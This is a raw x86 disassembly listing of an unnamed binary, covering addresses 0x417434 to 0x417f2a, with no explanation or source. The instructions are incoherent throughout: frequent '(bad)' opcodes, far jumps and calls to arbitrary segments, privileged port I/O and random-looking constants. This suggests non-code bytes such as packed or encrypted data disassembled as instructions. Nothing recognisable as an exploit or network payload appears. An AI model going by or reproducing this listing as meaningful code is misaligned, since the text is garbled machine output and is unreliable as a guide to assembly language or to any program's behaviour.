  417434:	test   BYTE PTR [eax],0x0
	...
  417493:	add    BYTE PTR [eax],al
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	cmovl  esi,esi
  4174a5:	(bad)  
  4174a6:	jmp    0x741759e
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [esi+ebp*8-0x7e],bh
  4174b1:	inc    edi
  4174b2:	shr    DWORD PTR [ecx+0x7a],cl
  4174b5:	sahf   
  4174b6:	or     eax,0x3b9b93b2
  4174bb:	dec    eax
  4174bc:	in     eax,dx
  4174bd:	sbb    cl,BYTE PTR [ecx+edi*4]
  4174c0:	adc    DWORD PTR [edi+0x14],esi
  4174c3:	jmp    0xa86a:0x7842aac0
  4174ca:	adc    al,0x91
  4174cc:	and    al,0x6f
  4174ce:	sbb    dl,BYTE PTR [ecx+eax*8+0x42e84c57]
  4174d5:	adc    eax,0xfd787cdf
  4174da:	mov    bh,0xa9
  4174dc:	and    ecx,eax
  4174de:	je     0x417498
  4174e0:	lahf   
  4174e1:	mov    ebx,0x53dc72fb
  4174e6:	int3   
  4174e7:	sub    DWORD PTR [edi-0xa],0xc5077c92
  4174ee:	mov    esi,0xb73da0ff
  4174f3:	bound  ebp,QWORD PTR [ecx]
  4174f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f6:	fs retf 0x331d
  4174fa:	sti    
  4174fb:	stos   BYTE PTR es:[edi],al
  4174fc:	aaa    
  4174fd:	jmp    0xb14:0x70482d91
  417504:	outs   dx,BYTE PTR ds:[esi]
  417505:	in     al,0xae
  417507:	mov    edi,0x78d939ab
  41750c:	xchg   edx,eax
  41750d:	pusha  
  41750e:	mov    eax,ds:0xaf01b771
  417513:	js     0x417496
  417515:	sbb    edi,DWORD PTR [ecx+0x8b9af95]
  41751b:	xor    ch,al
  41751d:	dec    ebp
  41751e:	nop
  41751f:	dec    edi
  417520:	enter  0xec7a,0xad
  417524:	(bad)  
  417525:	clc    
  417526:	adc    dh,BYTE PTR [ecx-0x5b]
  417529:	or     DWORD PTR [ecx+edx*8+0x50],0xb
  41752e:	es jg  0x4174ee
  417531:	aas    
  417532:	push   0x71
  417534:	mov    edi,0x8d55c54b
  417539:	fnstcw WORD PTR [esi+edx*4-0x6a]
  41753d:	jae    0x417590
  41753f:	jns    0x4174e9
  417541:	add    DWORD PTR [esi+0x2bd86faf],esi
  417547:	push   ds
  417548:	stc    
  417549:	pop    esi
  41754a:	sub    eax,0xec94efc
  41754f:	outs   dx,DWORD PTR ds:[esi]
  417550:	cmp    al,0x59
  417552:	nop
  417553:	mov    ecx,0xbe29274d
  417558:	outs   dx,BYTE PTR ds:[esi]
  417559:	call   0x1acc:0xa84d388a
  417560:	adc    DWORD PTR [esi-0x4ac728a5],esi
  417566:	add    al,0x3b
  417568:	pushf  
  417569:	(bad)  
  41756b:	retf   
  41756c:	or     ch,BYTE PTR [ebx-0xe747a9d]
  417572:	repz mov eax,DWORD PTR [ebp+ecx*2+0x2e13e90c]
  41757a:	leave  
  41757b:	test   eax,0xee6e687d
  417580:	mov    edi,0xabce11b0
  417585:	fnsave [ebx+0x69]
  417588:	jae    0x4175a8
  41758a:	push   edi
  41758b:	ins    BYTE PTR es:[edi],dx
  41758c:	fs aas 
  41758e:	mov    dl,0x77
  417590:	push   esp
  417591:	and    ecx,esi
  417593:	cdq    
  417594:	es fcompp 
  417597:	shl    DWORD PTR [edi],cl
  417599:	jl     0x4175b0
  41759b:	adc    BYTE PTR [ebx-0x3c],dl
  41759e:	fidivr WORD PTR [ebx+0x40b931ad]
  4175a4:	adc    eax,edi
  4175a6:	xchg   DWORD PTR [esi+0x15],ebx
  4175a9:	xor    al,0x6c
  4175ab:	pop    ebp
  4175ac:	adc    DWORD PTR [esi+0x59],edi
  4175af:	push   edi
  4175b0:	test   al,0x59
  4175b2:	mov    ebx,0xd842
	...
  417613:	add    BYTE PTR [eax],al
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fdivr  DWORD PTR [ebp-0xf65f520]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edx+0x3b858273],bl
  417633:	mov    bl,BYTE PTR [esi]
  417635:	(bad)  
  417636:	mov    ds:0xc000fd32,eax
  41763b:	jae    0x417665
  41763d:	dec    edx
  41763e:	sbb    eax,0xb06b1630
  417643:	psubq  mm1,mm1
  417646:	sub    edx,DWORD PTR [esi]
  417648:	call   0xfcdc932b
  41764d:	xchg   ebx,eax
  41764e:	call   0x61716b04
  417653:	mov    bh,0x85
  417655:	sbb    DWORD PTR [ebp+0x9],0xae8ba124
  41765c:	(bad)  
  41765d:	pop    edi
  41765e:	inc    esi
  41765f:	mov    bh,0x59
  417661:	jnp    0x417610
  417663:	test   ebp,ebx
  417665:	leave  
  417666:	test   BYTE PTR [eax-0x16],bh
  417669:	je     0x4176e8
  41766b:	push   cs
  41766c:	adc    BYTE PTR [eax-0x11561e4d],ah
  417672:	and    al,0xda
  417674:	fsub   st(4),st
  417676:	dec    eax
  417677:	mov    al,ds:0x5ec4379f
  41767c:	sbb    ecx,ecx
  41767e:	push   ebx
  41767f:	loope  0x41763e
  417681:	ret    
  417682:	inc    edx
  417683:	fisubr DWORD PTR cs:[eax]
  417686:	(bad)  
  417687:	fild   QWORD PTR [eax-0x64b59f04]
  41768d:	sbb    eax,DWORD PTR ds:0xedb26444
  417693:	mov    bl,0x75
  417695:	and    DWORD PTR [ebp-0x69e0b76f],eax
  41769b:	pushf  
  41769c:	adc    al,0x21
  41769e:	sbb    eax,0x8003c9a4
  4176a3:	pop    edi
  4176a4:	(bad)
  4176a8:	push   cs
  4176a9:	sbb    al,0x43
  4176ab:	sub    DWORD PTR [ebx+esi*1],esp
  4176ae:	mov    eax,ds:0xe4dcfecc
  4176b3:	jno    0x41765d
  4176b5:	popa   
  4176b6:	jge    0x417652
  4176b8:	mov    ecx,0x1621badd
  4176bd:	cwde   
  4176be:	jp     0x41771c
  4176c0:	setle  BYTE PTR [edi-0xa36aad5]
  4176c7:	pop    esi
  4176c8:	mov    bh,0x35
  4176ca:	push   DWORD PTR [esi-0x24]
  4176cd:	dec    eax
  4176ce:	mov    eax,0x50b9dff
  4176d3:	mov    bh,0x23
  4176d5:	dec    edi
  4176d6:	dec    edi
  4176d7:	jp     0x41769e
  4176d9:	or     al,0xc8
  4176db:	sbb    BYTE PTR [ebp+0x53],ch
  4176de:	clc    
  4176df:	sbb    ebp,DWORD PTR [edx]
  4176e1:	pop    es
  4176e2:	call   0x60c11202
  4176e7:	inc    esi
  4176e8:	sub    DWORD PTR [edx],0x4c39b7c4
  4176ee:	cs fcomp st(1)
  4176f1:	mov    ds:0xd474660a,al
  4176f6:	sbb    eax,0x24878d1f
  4176fb:	inc    ebx
  4176fc:	fs retf 0x5ee1
  417700:	int3   
  417701:	and    esp,DWORD PTR [ebp+0x3f]
  417704:	adc    DWORD PTR [ebp-0x343fad68],edx
  41770a:	jae    0x417788
  41770c:	pop    ss
  41770d:	mov    esi,0x7d59fda9
  417712:	sbb    DWORD PTR [ebp+0x67],esp
  417715:	aam    0x26
  417717:	stos   DWORD PTR es:[edi],eax
  417718:	dec    ebx
  417719:	sbb    edx,DWORD PTR [ebp+0x40ec8430]
  41771f:	adc    al,0x1e
  417721:	sbb    ecx,DWORD PTR [ebx+0xad3932d]
  417727:	dec    eax
  417728:	ins    DWORD PTR es:[edi],dx
  417729:	arpl   di,ax
  41772b:	inc    BYTE PTR [esi-0xd]
  41772e:	push   ss
  41772f:	test   ebp,ebx
  417731:	and    BYTE PTR [ebp-0x1d],bh
  417734:	jle    0x417736
	...
  417796:	jmp    0xff5975a9
  41779b:	imul   ecx
  41779d:	(bad)  
  41779e:	mov    bh,0x89
  4177a0:	jmp    0x4177bb
  4177a2:	jge    0x4177fa
  4177a4:	retf   0xf76f
  4177a7:	cmc    
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [edx+0x19ecfd53],dl
  4177b3:	push   esi
  4177b4:	pop    es
  4177b5:	frstor [ebx]
  4177b7:	aad    0xdf
  4177b9:	and    ebx,DWORD PTR [ebx-0x16f620ca]
  4177bf:	sbb    al,0x76
  4177c1:	mov    ss,WORD PTR [edi+eax*4]
  4177c4:	sbb    BYTE PTR [ebx-0x3a],0x32
  4177c8:	jp     0x417773
  4177ca:	sub    eax,DWORD PTR [esi]
  4177cc:	ins    DWORD PTR es:[edi],dx
  4177cd:	sbb    eax,0x769d8bb0
  4177d2:	pop    esp
  4177d3:	fsub   QWORD PTR [ecx]
  4177d5:	mov    bh,al
  4177d7:	imul   esp,DWORD PTR [ecx+0x37],0xe28cdaab
  4177de:	and    esi,DWORD PTR [edi]
  4177e0:	in     al,dx
  4177e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177e2:	sub    eax,0xbf5aebf4
  4177e7:	aaa    
  4177e8:	(bad)  
  4177e9:	adc    BYTE PTR [edx],al
  4177eb:	cli    
  4177ec:	pusha  
  4177ed:	sub    eax,0xe56a3737
  4177f2:	rcr    DWORD PTR [eax],0xe3
  4177f5:	repz imul edi,DWORD PTR [ecx+0x7ef1a7fc],0x7860d164
  417800:	test   BYTE PTR [eax-0x524985e2],0xf1
  417807:	push   eax
  417808:	test   ah,cl
  41780a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41780c:	xchg   esi,eax
  41780d:	adc    ebx,0x7b
  417810:	adc    BYTE PTR [esi+0x3df8c3],dh
  417816:	mov    ah,0xea
  417818:	adc    DWORD PTR [ebx],eax
  41781a:	and    bh,ah
  41781c:	pop    ds
  41781d:	pop    ebx
  41781e:	mov    DWORD PTR [edx-0x622d69ba],eax
  417824:	adc    BYTE PTR [ecx-0x7],dh
  417827:	hlt    
  417828:	xlat   BYTE PTR ds:[ebx]
  417829:	xor    DWORD PTR [edi+0x5f49ee5e],eax
  41782f:	xor    BYTE PTR [ebp+0x22cd660b],bl
  417835:	fmul   st,st(5)
  417837:	out    dx,eax
  417838:	jo     0x417801
  41783a:	jne    0x417805
  41783c:	push   0x106848ac
  417841:	in     eax,dx
  417842:	out    0x5e,al
  417844:	mov    bh,0xda
  417846:	lahf   
  417847:	aas    
  417848:	mov    ?,WORD PTR [ebp-0x2b837bda]
  41784e:	mov    ds:0xf3fe323e,al
  417853:	push   ecx
  417854:	push   esp
  417855:	sbb    al,0xdc
  417857:	je     0x417894
  417859:	shr    BYTE PTR [edi-0x77c1ae4],0xbf
  417860:	jns    0x4178cc
  417862:	jge    0x417866
  417864:	mov    ?,WORD PTR [ebx]
  417866:	cmp    al,0x72
  417868:	xchg   esp,eax
  417869:	cld    
  41786a:	ins    DWORD PTR es:[edi],dx
  41786b:	dec    eax
  41786c:	mov    ?,WORD PTR [eax-0x24]
  41786f:	call   0x3058c42a
  417874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417875:	dec    ecx
  417876:	call   0xb089adba
  41787b:	clc    
  41787c:	and    dl,BYTE PTR [ecx-0x4b403855]
  417882:	push   0xffffff9f
  417884:	daa    
  417885:	test   BYTE PTR ds:0xf8c1f548,cl
  41788b:	dec    esp
  41788c:	and    ax,0xa9c1
  417890:	dec    ebp
  417891:	jns    0x417842
  417893:	pushf  
  417894:	jbe    0x417880
  417896:	jge    0x4178f8
  417898:	out    0xf2,eax
  41789a:	sbb    DWORD PTR [ecx+ebx*2-0x72],ebp
  41789e:	mov    dh,0x43
  4178a0:	xor    DWORD PTR [ecx+0x61882172],ebp
  4178a6:	mov    ch,0xb1
  4178a8:	test   dh,al
  4178aa:	pop    edi
  4178ab:	ins    DWORD PTR es:[edi],dx
  4178ac:	and    BYTE PTR [ecx-0x1c28692e],0x10
  4178b3:	rol    WORD PTR [eax],1
	...
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x3860e3bb
  417923:	xchg   BYTE PTR [eax+0xf6fe85],bh
  417929:	add    BYTE PTR [edi],al
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [ebp-0x5a],dl
  417930:	sbb    al,0x4a
  417932:	fild   DWORD PTR ds:0x338a221
  417938:	cmp    eax,0xdc2fac6
  41793d:	out    0xce,eax
  41793f:	(bad)  
  417940:	ins    DWORD PTR es:[edi],dx
  417941:	dec    edi
  417942:	and    ch,BYTE PTR [edi+0x1faf68e4]
  417948:	cmp    BYTE PTR [ebp+0x260c252d],ch
  41794e:	xor    DWORD PTR [esi+0x33],esi
  417951:	in     al,dx
  417952:	int3   
  417953:	outs   dx,BYTE PTR ds:[esi]
  417954:	add    ecx,ebx
  417956:	jle    0x41797e
  417958:	jns    0x4179ba
  41795a:	or     eax,0x66f0d234
  41795f:	imul   edi,DWORD PTR [edx-0x48],0x5c
  417963:	pop    edx
  417964:	fisttp DWORD PTR [ebx-0x41]
  417967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417968:	aam    0xde
  41796a:	push   ebp
  41796b:	pop    es
  41796c:	clc    
  41796d:	xor    ecx,DWORD PTR [edi-0x2ffbe238]
  417973:	ret    
  417974:	ror    ah,cl
  417976:	mov    ds:0xa6eb37da,eax
  41797b:	jp     0x4179a4
  41797d:	pop    ss
  41797e:	test   eax,0xeb688bb8
  417983:	xchg   ebx,eax
  417984:	shr    BYTE PTR [edx],1
  417986:	sub    edi,DWORD PTR [edi+0x3e8fa46]
  41798c:	repz mov bl,0xcd
  41798f:	xor    BYTE PTR ds:0x554f938e,0x6d
  417996:	pushf  
  417997:	gs mov ch,0x88
  41799a:	adc    DWORD PTR [edi],ecx
  41799c:	loop   0x4179bf
  41799e:	cdq    
  41799f:	(bad)  
  4179a0:	mov    ds:0x4dc81696,eax
  4179a5:	lods   eax,DWORD PTR ds:[esi]
  4179a6:	(bad)
  4179a9:	pushf  
  4179aa:	imul   BYTE PTR [esi]
  4179ac:	cmp    esp,DWORD PTR [edx-0x75]
  4179af:	ds push edx
  4179b1:	das    
  4179b2:	rol    DWORD PTR [eax+0x499ab091],0x7e
  4179b9:	jp     0x417a29
  4179bb:	fnstcw WORD PTR [eax+ebp*8]
  4179be:	mov    edi,0x1adb2aa8
  4179c3:	or     bl,al
  4179c5:	icebp  
  4179c6:	or     eax,0x9165b4f0
  4179cb:	pop    ss
  4179cc:	pop    ds
  4179cd:	pushf  
  4179ce:	je     0x417995
  4179d0:	pop    eax
  4179d1:	jnp    0x417a24
  4179d3:	sbb    ecx,DWORD PTR [eax+0x14]
  4179d6:	ins    BYTE PTR es:[edi],dx
  4179d7:	pop    edi
  4179d8:	add    DWORD PTR [ecx],eax
  4179da:	lahf   
  4179db:	stos   DWORD PTR es:[edi],eax
  4179dc:	das    
  4179dd:	sbb    BYTE PTR ds:0xa0438167,ah
  4179e3:	out    dx,al
  4179e4:	mov    al,0x7b
  4179e6:	jb     0x417996
  4179e8:	cmc    
  4179e9:	cld    
  4179ea:	xor    DWORD PTR [eax+0x214bd95d],0x36247a9
  4179f4:	mov    al,0xc5
  4179f6:	repz fdivr QWORD PTR [eax+0x6f]
  4179fa:	pop    ebp
  4179fb:	push   ss
  4179fc:	xchg   edi,eax
  4179fd:	shl    BYTE PTR [esi+0x31e032c5],1
  417a03:	sbb    DWORD PTR ds:0x66888f13,0x1f231666
  417a0d:	mov    es,WORD PTR [esi+eax*2+0x6c]
  417a11:	mov    dl,dl
  417a13:	lahf   
  417a14:	adc    ebp,ebp
  417a16:	cli    
  417a17:	ss and eax,0x215ee035
  417a1d:	jb     0x4179b8
  417a1f:	pop    ss
  417a20:	(bad)  
  417a21:	mov    edi,0x7a87069b
  417a26:	int    0x8
  417a28:	aam    0xfc
  417a2a:	mov    esp,0x93f38514
  417a2f:	pop    ebp
  417a30:	call   0x58c1985c
	...
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx+0x9]
  417aa3:	cmp    al,0x4a
  417aa5:	or     eax,DWORD PTR ds:0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    BYTE PTR [edx-0x25896078],al
  417ab3:	aas    
  417ab4:	popa   
  417ab5:	mov    WORD PTR [edx],sp
  417ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ab9:	aas    
  417aba:	retf   0xa3df
  417abd:	xchg   ecx,eax
  417abe:	adc    bh,BYTE PTR [eax+ebx*8+0xf]
  417ac2:	into   
  417ac3:	(bad)  
  417ac4:	and    eax,0x54274868
  417ac9:	lds    ebp,FWORD PTR [eax-0x1f0c8293]
  417acf:	test   eax,0x5f1d4ca1
  417ad4:	mov    DWORD PTR [edi+edi*8],ecx
  417ad7:	aam    0x6
  417ad9:	xchg   esi,eax
  417ada:	push   edi
  417adb:	jle    0x417ae6
  417add:	sub    ch,BYTE PTR [edi]
  417adf:	or     DWORD PTR [ebx-0x54a354b3],eax
  417ae5:	jbe    0x417af2
  417ae7:	pop    eax
  417ae8:	fdivr  st,st(1)
  417aea:	xchg   ebp,eax
  417aeb:	loope  0x417b61
  417aed:	cmp    eax,0x4024feca
  417af2:	adc    ebx,DWORD PTR [ecx+0x25]
  417af5:	jp     0x417b21
  417af7:	adc    cl,BYTE PTR [eax-0x245e0e17]
  417afd:	fnstsw WORD PTR [edx]
  417aff:	out    dx,al
  417b00:	movhps xmm6,QWORD PTR [edi]
  417b03:	xor    BYTE PTR [ebx-0x69],al
  417b06:	cmp    DWORD PTR [esi-0x8c01a85],0x67
  417b0d:	xchg   DWORD PTR ds:[edi],ebp
  417b10:	pop    es
  417b11:	and    esi,DWORD PTR [edi]
  417b13:	aas    
  417b14:	mov    bh,0xea
  417b16:	and    ecx,edi
  417b18:	mov    edx,0x88b3c029
  417b1d:	pop    esp
  417b1e:	adc    bh,cl
  417b20:	dec    edx
  417b21:	jb     0x417b8b
  417b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b24:	xchg   edx,eax
  417b25:	cmp    DWORD PTR [ecx],ebp
  417b27:	lods   eax,DWORD PTR ds:[esi]
  417b28:	add    edi,DWORD PTR [ecx-0x34]
  417b2b:	call   0x2b90:0x78f609c1
  417b32:	lock js 0x417b14
  417b35:	jge    0x417b24
  417b37:	pop    ebx
  417b38:	out    0x7f,eax
  417b3a:	add    edx,ebp
  417b3c:	nop
  417b3d:	or     BYTE PTR [ecx],bl
  417b3f:	sbb    BYTE PTR [ecx+ebp*8-0x645b793c],dl
  417b46:	xor    bh,BYTE PTR [eax+0x49]
  417b49:	add    al,0x94
  417b4b:	lock or eax,0xcdfb92eb
  417b51:	cdq    
  417b52:	sbb    eax,0xbd42222e
  417b57:	cmp    ah,ah
  417b59:	adc    ch,BYTE PTR [ebx]
  417b5b:	sub    BYTE PTR [ebp+0x68],0xa3
  417b5f:	aam    0x5c
  417b61:	sub    al,0x10
  417b63:	popa   
  417b64:	add    edi,edi
  417b66:	arpl   WORD PTR [ecx+0x44ce4a56],si
  417b6c:	sub    esp,0xc3603caf
  417b72:	cmp    dh,BYTE PTR [esi]
  417b74:	call   0x7f86:0x260f
  417b7a:	jg     0x417b6b
  417b7c:	data16 into 
  417b7e:	adc    DWORD PTR [ebx-0x430ad9e0],edx
  417b84:	and    eax,0x902549bb
  417b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b8a:	ss jp  0x417bab
  417b8d:	dec    esp
  417b8e:	jne    0x417b24
  417b90:	pop    ss
  417b91:	inc    edi
  417b92:	cmp    ebp,DWORD PTR [edi-0x264217e7]
  417b98:	lds    eax,FWORD PTR [ecx+0x21]
  417b9b:	xor    eax,0x9b0670dd
  417ba0:	or     esi,DWORD PTR [edi+eiz*4]
  417ba3:	or     DWORD PTR [edx+0x1e],eax
  417ba6:	rcr    esi,1
  417ba8:	cwde   
  417ba9:	push   0xf1f06ead
  417bae:	add    DWORD PTR [edx],ebx
  417bb0:	inc    ebx
  417bb1:	or     ch,BYTE PTR [ebx+0x98b]
	...
  417c13:	add    BYTE PTR [eax],al
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0x23
  417c23:	int3   
  417c24:	mov    esp,0xf90cc6
  417c29:	add    BYTE PTR [edi],al
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [ebp+ebp*8-0x18bd7b29],bl
  417c34:	repz pop esi
  417c36:	js     0x417bee
  417c38:	aad    0x7f
  417c3a:	push   esi
  417c3b:	loop   0x417c76
  417c3d:	pop    esi
  417c3e:	or     al,0x88
  417c40:	dec    esp
  417c41:	jnp    0x417c91
  417c43:	cmp    al,0x41
  417c45:	pop    ebx
  417c46:	cmp    edx,ecx
  417c48:	scas   eax,DWORD PTR es:[edi]
  417c49:	mov    ecx,0xf1de2b12
  417c4e:	mov    ecx,0xa1ea502f
  417c53:	sub    bh,BYTE PTR [edx+0x7096aec4]
  417c59:	jne    0x417ca4
  417c5b:	jge    0x417c9f
  417c5d:	(bad)  [esi-0x331f677c]
  417c63:	inc    edi
  417c64:	or     bl,cl
  417c66:	daa    
  417c67:	rcr    dh,1
  417c69:	sub    cl,BYTE PTR [edx+0x56]
  417c6c:	xlat   BYTE PTR ds:[ebx]
  417c6d:	pop    edx
  417c6e:	add    ecx,DWORD PTR [esi+0x3691f382]
  417c74:	jmp    0x417c23
  417c76:	sub    BYTE PTR [edi-0x4d828ff5],dh
  417c7c:	xor    ebx,DWORD PTR [ebp+ebp*4+0x6e]
  417c80:	and    al,0xd8
  417c82:	cmp    al,0x37
  417c84:	iret   
  417c85:	shl    BYTE PTR [edx],0xef
  417c88:	mov    BYTE PTR [ecx-0x75119c55],dh
  417c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c90:	dec    ebx
  417c91:	jg     0x417c16
  417c93:	jmp    0x417c38
  417c95:	test   al,0x1b
  417c98:	jbe    0x417ca4
  417c9a:	or     al,0x97
  417c9c:	xlat   BYTE PTR es:[ebx]
  417c9e:	lds    edi,FWORD PTR [ebx+0x2521b911]
  417ca4:	mov    edx,0x2f496abc
  417ca9:	mov    dl,0xa1
  417cab:	jbe    0x417d26
  417cad:	xchg   ebx,eax
  417cae:	call   0x72064532
  417cb3:	in     eax,0xfd
  417cb5:	jl     0x417d0a
  417cb7:	xor    DWORD PTR [ebp+0x4c50e078],esp
  417cbd:	dec    DWORD PTR [edx+0x3e0fbf82]
  417cc3:	imul   edx,DWORD PTR [edx],0xfffffff3
  417cc6:	inc    esi
  417cc7:	fwait
  417cc8:	inc    ebp
  417cc9:	out    0xe6,eax
  417ccb:	cld    
  417ccc:	pop    edi
  417ccd:	sbb    eax,0x9ef38808
  417cd2:	bound  esi,QWORD PTR ds:0x367ef62
  417cd8:	cwde   
  417cd9:	ss or  eax,0xc1ce9e14
  417cdf:	push   edx
  417ce0:	pop    ebp
  417ce2:	xchg   edx,eax
  417ce3:	adc    DWORD PTR ds:0xe3cbb22,ebp
  417ce9:	cmp    al,0xd3
  417ceb:	pop    eax
  417cec:	and    ah,bl
  417cee:	imul   ecx,esi,0x9069b16b
  417cf4:	cdq    
  417cf5:	or     edx,ebx
  417cf7:	dec    ebp
  417cf8:	xor    eax,0x3adda3ac
  417cfd:	jecxz  0x417d47
  417cff:	mov    ecx,0x325649cc
  417d04:	mov    ebp,0xe38da492
  417d09:	xor    esi,0x57371ac8
  417d0f:	popf   
  417d10:	ds xchg esi,eax
  417d12:	push   esp
  417d13:	fucomi st,st(7)
  417d15:	inc    ebp
  417d16:	ret    0x4124
  417d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d1a:	shl    ch,1
  417d1c:	xchg   esp,eax
  417d1d:	das    
  417d1e:	jle    0x417d68
  417d20:	xor    DWORD PTR [ecx+0x5bc369a5],ebp
  417d26:	call   0xc1e5bd4a
  417d2b:	xor    bl,BYTE PTR [esp+eiz*4]
  417d2e:	and    dl,BYTE PTR [edx-0x7ffdd90b]
  417d34:	add    BYTE PTR es:[eax],al
	...
  417d93:	add    BYTE PTR [eax],al
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x77
  417da3:	cmp    eax,0xfa13fcb3
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [edi-0xc601dda],ah
  417db3:	iret   
  417db4:	inc    ecx
  417db5:	xor    eax,0xce3d7487
  417dba:	cdq    
  417dbb:	and    bh,BYTE PTR [ebp-0x2b8a3537]
  417dc1:	je     0x417dca
  417dc3:	test   eax,0xfe5ba85e
  417dc8:	pop    es
  417dc9:	int    0xcd
  417dcb:	arpl   WORD PTR ds:0x9db769e,bp
  417dd1:	ror    ecx,cl
  417dd3:	dec    esi
  417dd4:	mov    dl,0xef
  417dd6:	leave  
  417dd7:	hlt    
  417dd8:	push   0x37
  417dda:	dec    ecx
  417ddb:	stos   BYTE PTR es:[edi],al
  417ddc:	add    DWORD PTR [eax+eax*4-0x52],ecx
  417de0:	frstor [eax]
  417de2:	jo     0x417d9e
  417de4:	int3   
  417de5:	adc    al,0xac
  417de7:	test   BYTE PTR [ecx+0x52fc57c],ch
  417ded:	mov    ebx,0xd54bbbf1
  417df2:	push   ebp
  417df3:	hlt    
  417df4:	cli    
  417df5:	idiv   BYTE PTR [ecx-0x797e6db2]
  417dfb:	xor    eax,0x6dbbd132
  417e00:	or     edx,DWORD PTR [edx+0x18e697e7]
  417e06:	and    DWORD PTR [edi],ebx
  417e08:	pop    edx
  417e09:	(bad)  
  417e0a:	adc    dl,0xa5
  417e0d:	inc    esi
  417e0e:	fdiv   QWORD PTR [esi+0x13]
  417e11:	mov    ds:0x651e308c,al
  417e16:	js     0x417e47
  417e18:	jno    0x417da0
  417e1a:	adc    BYTE PTR [edx-0xd],0xd8
  417e1e:	inc    ecx
  417e1f:	imul   edi,DWORD PTR [eax+0x6a],0x77
  417e23:	or     DWORD PTR [edx+edx*2+0x1f4ca433],esp
  417e2a:	sub    DWORD PTR [edi+0x678fc411],edx
  417e30:	add    eax,DWORD PTR [ebx+0x5d]
  417e33:	je     0x417e32
  417e35:	fild   DWORD PTR [ebp+0x7d]
  417e38:	loopne 0x417eb2
  417e3a:	add    al,0xc3
  417e3c:	xchg   edx,eax
  417e3d:	sub    DWORD PTR [edi],ecx
  417e3f:	xchg   ebx,eax
  417e40:	(bad)  
  417e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e42:	dec    ebp
  417e43:	mov    edx,0xa676dcdc
  417e48:	cmp    eax,0x7b9beaca
  417e4d:	jnp    0x417dd2
  417e4f:	push   cs
  417e50:	sub    BYTE PTR [esi-0x6a],bh
  417e53:	nop
  417e54:	lea    ecx,[ecx+0x9]
  417e57:	xchg   edi,esp
  417e59:	and    BYTE PTR fs:[ebx],al
  417e5c:	das    
  417e5d:	cmp    BYTE PTR [ebx+esi*4],dh
  417e60:	pop    eax
  417e61:	jb     0x417e2d
  417e63:	rol    DWORD PTR [ecx+0x32d96930],1
  417e69:	lods   eax,DWORD PTR ds:[esi]
  417e6a:	loopne 0x417ee3
  417e6c:	cli    
  417e6d:	inc    eax
  417e6e:	xchg   edx,eax
  417e6f:	mov    DWORD PTR [edi-0x3dc843db],ecx
  417e75:	push   edx
  417e76:	popa   
  417e77:	ja     0x417e3f
  417e79:	push   ebp
  417e7a:	div    edx
  417e7c:	rol    bl,1
  417e7e:	and    ch,BYTE PTR [ebp-0x4b]
  417e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e82:	lds    ebx,FWORD PTR [ecx+0x1c]
  417e85:	jo     0x417e33
  417e87:	div    DWORD PTR [ebp+0x2c9edeec]
  417e8d:	or     BYTE PTR [ebx+0x4a],dh
  417e90:	inc    edx
  417e91:	dec    ebp
  417e92:	or     al,bh
  417e94:	pop    eax
  417e95:	or     eax,0xe7c1ec18
  417e9a:	or     DWORD PTR [ebp+0x394d98ab],edx
  417ea0:	fsubr  QWORD PTR [ebx]
  417ea2:	outs   dx,DWORD PTR ds:[esi]
  417ea3:	xchg   ebx,eax
  417ea4:	and    ebp,0xd3dd0508
  417eaa:	dec    ebp
  417eab:	mov    ecx,0x2ff3975f
  417eb0:	rol    edi,1
  417eb2:	(bad)  [ebx]
  417eb4:	int3   
	...
  417f15:	add    BYTE PTR [edx-0x1a],ah
  417f18:	out    0x3b,al
  417f1a:	out    0x3b,al
  417f1c:	(bad)  
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	stos   DWORD PTR es:[edi],eax
  417f23:	pop    edx
  417f24:	pop    es
  417f25:	sahf   
  417f26:	sbb    bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
